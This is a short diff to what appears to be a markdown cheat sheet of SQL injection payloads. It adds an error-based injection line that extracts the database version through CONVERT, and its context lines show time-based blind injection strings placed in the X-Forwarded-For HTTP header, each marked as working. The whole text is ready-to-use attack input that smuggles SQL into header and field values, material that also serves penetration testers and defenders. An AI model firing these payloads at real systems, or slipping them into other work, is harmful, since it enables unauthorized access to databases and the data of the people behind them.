@@ -27,6 +27,8 @@ ___
 ### Examples
 ```sql
 
+AND 1=CONVERT(int, (SELECT @@version))
+
 X-Forwarded-For: "' or sleep(30)='" >> For any type of HTTP headers ✔
 
 X-Forwarded-For: 127.0.0.1' AND (SELECT * FROM (SELECT(SLEEP(5)))x) AND '1'='1 ✔
